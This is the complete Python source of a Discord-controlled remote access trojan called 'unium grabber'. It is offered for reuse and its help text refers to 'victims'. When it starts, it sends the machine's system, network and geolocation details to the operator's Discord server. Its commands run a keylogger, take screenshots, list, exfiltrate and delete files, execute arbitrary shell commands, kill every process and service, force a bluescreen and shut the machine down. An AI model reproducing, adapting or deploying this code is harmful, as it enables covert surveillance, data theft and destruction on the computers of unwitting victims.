# unium grabber developers: @soacy
# honorable mentions: ChatGPT 3.5, Google Gemini

# Feel free to change any code to your liking! (my code shitty ik lol)
# If you didn't read anything in the github please take a moment to read it, if you don't know what you are doing.

# I did also make it a little organized so you can find stuff easier. Enjoy!

import io, os, sys, ctypes, psutil, discord, asyncio, requests, datetime, platform, threading, pyautogui, subprocess
from pynput import keyboard
from discord.ext import commands

token = "YOUR_BOT_TOKEN_HERE" # Replace with your bot token
prefix = "." # Your command prefix, change it to your liking!

intents = discord.Intents.all()
intents.members = True
client = commands.Bot(command_prefix=prefix, intents=intents)
keylogger_running = False

# ----------------------------------------------------------------------------------------------------------------------------------------- #
# Grabber Commands

@client.command()  # Purge Command
async def purge(ctx):
    guild = ctx.guild
    for channel in guild.channels:
        await channel.delete()

@client.command() # Keylogger Start Command
async def kl(ctx):
    global keylogger_running
    if not keylogger_running:
        keyboard.on_press(on_key_press)
        keylogger_running = True
        await ctx.send("Keylogger Started.")
    else:
        await ctx.send("Keylogger is already running.")

@client.command() # Keylogger Stop Command
async def kls(ctx):
    global keylogger_running
    if keylogger_running:
        keyboard.unhook_all()
        keylogger_running = False
        await ctx.send("Keylogger Stopped.")
    else:
        await ctx.send("Keylogger is not running.")

async def send_keystroke_to_discord(message): # Keystrokes to channel
    current_time = datetime.datetime.now().strftime('%m-%d-%Y %H:%M:%S')
    pc_name = platform.node()
    guild = client.guilds[0]
    for category in guild.categories:
        if category.name == pc_name:
            key_channel = discord.utils.get(category.channels, name='key-logs')
            if not key_channel:
                key_channel = await category.create_text_channel('key-logs')
    await key_channel.send(f'`[{current_time}]` {message}')

def on_key_press(event): # On key press event
    key_name = event.name
    client.loop.create_task(send_keystroke_to_discord(key_name))

@client.command() # Screenshot Command
async def ss(ctx):
    await take_screenshot()

@client.command() # Process List Command
async def proclist(ctx): 
  try:
    with open("process_list.txt", "w") as f:
      for i, proc in enumerate(psutil.process_iter(['name', 'pid'])):
        f.write(f"[{proc.info['pid']}] {proc.info['name']}\n")

    await ctx.send(file=discord.File("process_list.txt"))
    os.remove("process_list.txt")

  except Exception as e:
    await ctx.send(f"Error getting process list: {e}")

@client.command() # End Process Command
async def endproc(ctx, proc_identifier: str):
    if proc_identifier.isdigit():
        proc_identifier = int(proc_identifier)
    for proc in psutil.process_iter():
        try:
            if proc.name() == proc_identifier or proc.pid == proc_identifier:
                proc.terminate()
                await ctx.send(f"Process {proc_identifier} has been terminated.")
                await asyncio.wait(6)
                await ctx.channel.purge(limit=2)
                return
        except psutil.NoSuchProcess:
            pass
    await ctx.send(f"No process found with identifier {proc_identifier}.")

@client.command() # Grabs files
async def filelist(ctx):
    files_list = [filename for filename in os.listdir() if os.path.isfile(filename)]
    file_content = "\n".join(files_list)
    with open('files_list.txt', 'w') as f:
        f.write(file_content)
    with open('files_list.txt', 'rb') as f:
        await ctx.send("Files in the same directory:", file=discord.File(f, filename='files_list.txt'))
    os.remove('files_list.txt')

@client.command() # Sends file
async def filesend(ctx, file_name: str):
    if os.path.isfile(file_name):
        with open(file_name, 'rb') as f:
            await ctx.send(file=discord.File(f, filename=file_name))
    else:
        await ctx.send(f"File '{file_name}' not found.")

@client.command() # Deletes file
async def filedel(ctx, file_name: str):
    if os.path.isfile(file_name):
        try:
            os.remove(file_name)
            await ctx.send(f"File '{file_name}' has been deleted successfully.")
        except Exception as e:
            await ctx.send(f"An error occurred while deleting file '{file_name}': {str(e)}")
    else:
        await ctx.send(f"File '{file_name}' not found.")

@client.command() # Nuke PC Command..
async def nuke(ctx):
    confirm_msg = await ctx.send("`☢ Are you sure you want to Nuke their PC? ☢`\n*This will basically bluescreen them. This might corrupt files.*")
    await confirm_msg.add_reaction('✅')
    await confirm_msg.add_reaction('❌')
    def check(reaction, user):
        return user == ctx.author and str(reaction.emoji) in ['✅', '❌'] and reaction.message == confirm_msg
    try:
        reaction, user = await client.wait_for('reaction_add', timeout=60.0, check=check)
    except asyncio.TimeoutError:
        await ctx.send('You took too long to react, nuke cancelled.')
    else:
        if str(reaction.emoji) == '✅': 
            end_all_services()
            end_all_processes()
            for _ in range(100):
                ctypes.windll.user32.MessageBoxW(0, "YOUR PC HAS BEEN NUKED BY /UNIUM", "/unium on top", 0)
            ctx.send("Nuked.")
        elif str(reaction.emoji) == '❌': 
            await ctx.send("Nuke cancelled.")

def end_all_services(): # Nuke all services
    services_output = subprocess.check_output('sc query state= all', shell=True, universal_newlines=True)
    service_names = [line.split()[1] for line in services_output.split('\n') if line.strip().startswith('SERVICE_NAME')]
    for service_name in service_names:
        subprocess.run(["sc", "stop", service_name], shell=True)

def end_all_processes(): # Nuke all proccesses
    running_processes = psutil.process_iter()
    for process in running_processes:
        try:
            process.terminate()
        except psutil.AccessDenied:
            pass

@client.command() # Shutdown Victims PC
async def shutdown(ctx):
    ctx.send("Shutting down their PC..")
    os.system("shutdown /s /f /t 0")

@client.command() # Restart Victims PC
async def restart(ctx):
    ctx.send("Restarting their PC..")
    os.system("shutdown /r /f /t 0")

@client.command() # Send message to Victim
async def message(ctx, title: str, content: str):
    def show_message_box():
        ctypes.windll.user32.MessageBoxW(0, content, title, 0x40 | 0x1 | 0x30)
    await ctx.send(f"Message Sent!")
    thread = threading.Thread(target=show_message_box)
    thread.start()
    await asyncio.sleep(2)

@client.command() # Bluescreen Victim
async def bluescreen(ctx):
    await ctx.send(f"Bluescreened.")
    ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
    ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0) == 0
    sys.exit()

@client.command() # Execute any command
async def cmd(ctx, content: str):
    try:
        result = subprocess.run(content, shell=True, capture_output=True, text=True)
        output = result.stdout or result.stderr
        await ctx.send(f"```{output}```")
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

@client.command() # Change victims bg
async def wallpaper(ctx, uploaded_file: discord.Attachment):
    try:
        if not uploaded_file.content_type.startswith('image'):
            raise ValueError("Uploaded file must be an image.")
        temp_file_path = os.path.abspath(f"temp_wallpaper_{uploaded_file.filename}")
        image_data = await uploaded_file.read()
        with open(temp_file_path, "wb") as temp_file:
            temp_file.write(image_data)
        SPI_SETDESKWALLPAPER = 20
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, temp_file_path, 3)
        await ctx.send(content=f"Wallpaper changed to: {uploaded_file.filename}")
        os.remove(temp_file_path)
    except ValueError as e:
        await ctx.send(content=f"Error: {e}")
    except Exception as e:
        await ctx.send(content=f"An error occurred: {e}")

@client.command() # Lock pc
async def lock(ctx):
    try:
        ctypes.windll.user32.LockWorkStation()
        await ctx.send(content="Locking the screen...")
    except Exception as e:
        await ctx.send(content=f"An error occurred: {e}")

@client.command() # Open a website
async def opensite(ctx, website: str):
    if not website.startswith("https://"):
        await ctx.send("Please provide a valid URL.")
        return
    os.system(f"start {website}")
    await ctx.send(f"Website opened: {website}")

# ----------------------------------------------------------------------------------------------------------------------------------------- #
# Grabber Stuff

async def get_pc_info(): # Grabbing pc info
    guild = client.guilds[0]
    pc_name = platform.node()
    existing_category = discord.utils.get(guild.categories, name=pc_name)
    if not existing_category:
        main = await guild.create_category(pc_name)
    else:
        main = existing_category
    system_channel = discord.utils.get(main.channels, name='system')
    if not system_channel:
        system_channel = await main.create_text_channel('system')
    pc_info = f""
    pc_info += f"PC Name: {platform.node()}\n"
    pc_info += f"System: {platform.system()} {platform.release()}\n"
    pc_info += f"Processor: {platform.processor()}\n"
    pc_info += f"Architecture: {platform.architecture()[0]}\n"
    pc_info += f"OS Version: {platform.version()}\n"
    pc_info += f"Manufacturer: {platform.system()} {platform.machine()}\n"
    pc_info += f"Configuration: {platform.platform()}\n"
    pc_info += f"Machine: {platform.machine()}\n"
    pc_info += f"Threads: {os.cpu_count()}\n"
    pc_info += f"Python Version: {platform.python_version()}\n"
    mem = psutil.virtual_memory()
    pc_info += f"\nTotal RAM: {mem.total / (1024 ** 3):.2f} GB\n"
    pc_info += f"Used RAM: {mem.used / (1024 ** 3):.2f} GB\n"
    pc_info += f"Free RAM: {mem.available / (1024 ** 3):.2f} GB\n"
    disk = psutil.disk_usage('/')
    pc_info += f"\nTotal Disk Space: {disk.total / (1024 ** 3):.2f} GB\n"
    pc_info += f"Used Disk Space: {disk.used / (1024 ** 3):.2f} GB\n"
    pc_info += f"Free Disk Space: {disk.free / (1024 ** 3):.2f} GB\n"
    system_thumbnail_url = "https://cdn-icons-png.flaticon.com/512/4370/4370714.png"
    pc_embed = create_embed("System Information", pc_info, 0xFFFFFF, thumbnail_url=system_thumbnail_url)
    await system_channel.send(embed=pc_embed)

async def get_network_info(): # Grabbing network info
    guild = client.guilds[0]
    pc_name = platform.node()
    existing_category = discord.utils.get(guild.categories, name=pc_name)
    if not existing_category:
        main = await guild.create_category(pc_name)
    else:
        main = existing_category
    network_channel = discord.utils.get(main.channels, name='network')
    if not network_channel:
        network_channel = await main.create_text_channel('network')
    net_info = f""
    net_if_addrs = psutil.net_if_addrs()
    for interface_name, interface_addresses in net_if_addrs.items():
        net_info += f"\n {interface_name}:\n"
        for address in interface_addresses:
            net_info += f"   - Address: {address.address}\n"
            net_info += f"   - Netmask: {address.netmask}\n"
            net_info += f"   - Broadcast IP: {address.broadcast}\n"
    network_thumbnail_url = "https://upload.wikimedia.org/wikipedia/commons/thumb/0/08/Internet-icon.svg/470px-Internet-icon.svg.png"
    net_embed = create_embed("Network Information", net_info, 0xFFFFFF, thumbnail_url=network_thumbnail_url)
    await network_channel.send(embed=net_embed)
    await send_ip_info()
    
async def send_ip_info(): # Sending location info
    guild = client.guilds[0]
    pc_name = platform.node()
    ip_info = get_own_ip_info()
    existing_category = discord.utils.get(guild.categories, name=pc_name)
    if not existing_category:
        main = await guild.create_category(pc_name)
    else:
        main = existing_category
    network_channel = discord.utils.get(main.channels, name='network')
    ip_thumbnail_url = "https://cdn-icons-png.flaticon.com/512/535/535239.png"
    ip_embed = create_embed("Location Information", ip_info, 0xFFFFFF, thumbnail_url=ip_thumbnail_url)
    await network_channel.send(embed=ip_embed)
 
def get_own_ip_info(): # Grabbing location info
    try:
        response = requests.get('https://ipinfo.io')
        data = response.json()
        loc_info = f"IP Address: {data.get('ip')}\n"
        loc_info += f"City: {data.get('city')}\n"
        loc_info += f"State: {data.get('region')}\n"
        loc_info += f"Country: {data.get('country')}\n"
        loc_info += f"Coords: {data.get('loc')}\n"
        loc_info += f"ISP: {data.get('org')}\n"
        loc_info += f"Hostname: {data.get('hostname')}\n"
        loc_info += f"Postal Code: {data.get('postal')}\n"
        loc_info += f"Timezone: {data.get('timezone')}\n"
        loc_info += f"ASN: {data.get('asn')}"
        return loc_info
    except:
        return None

async def take_screenshot(): # Taking a screenshot and sending it
    screenshot = pyautogui.screenshot()
    pc_name = platform.node()
    guild = client.guilds[0]
    for category in guild.categories:
        if category.name == pc_name:
            desktop_channel = discord.utils.get(category.channels, name='desktop')
            if not desktop_channel:
                desktop_channel = await category.create_text_channel('desktop')
            with io.BytesIO() as image_binary:
                screenshot.save(image_binary, 'PNG')
                image_binary.seek(0)
                embed = discord.Embed(title='.ss to take another', color=0xFFFFFF)
                embed.set_author(name="/unium")
                embed.set_image(url="attachment://screenshot.png")
                await desktop_channel.send(embed=embed, file=discord.File(image_binary, 'screenshot.png'))
            break
    else:
        pass

async def send_commands_info(): # Sending commands
    guild = client.guilds[0]
    pc_name = platform.node()
    existing_category = discord.utils.get(guild.categories, name=pc_name)
    if not existing_category:
        main = await guild.create_category(pc_name)
    else:
        main = existing_category
    commands_channel = discord.utils.get(main.channels, name='commands')
    if not commands_channel:
        commands_channel = await main.create_text_channel('commands')
    commands_info = f"**/unium commands**```\n{prefix}purge -  Purge all server channels\n{prefix}ss - Takes a screenshot\n{prefix}proclist - Shows all running processes\n{prefix}endproc (name / pid) - End a process\n{prefix}filelist - Gets files in the same directory\n{prefix}filesend (name) - Sends that file to you\n{prefix}filedel (name) - Deletes a file\n{prefix}kl - Start the keylogger\n{prefix}kls - Stop the keylogger\n{prefix}shutdown - Shutdown victims PC\n{prefix}restart - Restart victims PC\n{prefix}lock - Locks victims pc\n{prefix}message (title) (message) - Message your victim\n{prefix}cmd (command) - Execute a command\n{prefix}wallpaper (image file) - Change your victims pc wallpaper\n{prefix}opensite (url) - Opens a website\n\n* {prefix}bluescreen - Bluescreen your victim\n* {prefix}nuke - Rain havoc against your victims pc!!1!\n\nCommands with * means the grabber may need to be ran as admin.```"
    await commands_channel.send(commands_info)

def create_embed(title, description, color, thumbnail_url=None): # Embed Stuff
    embed = discord.Embed(title=title, description=description, color=color)
    embed.set_author(name='/unium')
    if thumbnail_url:
        embed.set_thumbnail(url=thumbnail_url)
    return embed

# ----------------------------------------------------------------------------------------------------------------------------------------- #
# Main Stuff

@client.event
async def on_ready(): # Main stuff
    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.playing, name="unium grabber on top!")) # You can also change what the bots activity is!
    guild = client.guilds[0]
    pc_name = platform.node()
    existing_category = discord.utils.get(guild.categories, name=pc_name)
    if not existing_category:
        main = await guild.create_category(pc_name)
    else:
        main = existing_category
    await get_pc_info()
    await get_network_info()
    await take_screenshot()
    await send_commands_info()

if __name__ == "__main__":
    client.run(token)